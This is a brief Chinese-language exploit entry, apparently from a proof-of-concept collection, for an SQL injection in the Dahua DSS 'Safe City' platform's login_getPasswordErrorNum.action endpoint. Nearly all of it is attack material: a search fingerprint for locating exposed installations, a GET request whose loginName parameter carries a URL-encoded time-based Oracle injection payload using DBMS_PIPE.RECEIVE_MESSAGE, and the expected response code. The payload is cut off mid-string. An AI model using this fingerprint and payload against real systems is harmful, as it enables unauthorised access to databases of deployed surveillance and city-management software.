# 大华DSS平安城市login_getPasswordErrorNum.action存在SQL注入漏洞

大华 ｜ SQL注入 ｜ —
- **指纹**：`body="itc/login_init.action"`
- **请求**：`GET /itc/$%7BappPath%7D/login_getPasswordErrorNum.action?userBean.loginName=admin%27%2F%2A%2A%2FAND%2F%2A%2A%2F9434%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2881%29%7C%7CCHR%2876%29%7C%7CCHR%2872%29%7C%7CCHR`
- **响应特征**：200